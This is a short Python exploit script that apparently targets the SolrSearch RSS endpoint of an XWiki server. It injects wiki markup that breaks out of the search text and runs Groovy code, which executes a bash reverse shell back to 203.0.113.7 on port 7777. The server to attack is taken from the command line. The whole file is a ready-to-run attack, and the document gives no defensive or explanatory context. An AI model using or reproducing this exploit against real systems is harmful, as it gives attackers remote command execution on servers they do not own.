import sys
from urllib.parse import urlencode
from urllib.request import urlopen

injection = '}}}{{async async=false}}{{groovy}}println("/bin/bash -i >& /dev/tcp/203.0.113.7/7777 0>&1".execute().text){{/groovy}}{{/async}}'
parameters = urlencode({"media": "rss", "text": injection})
urlopen(sys.argv[1].rstrip("/") + "/bin/get/Main/SolrSearch?" + parameters).read()
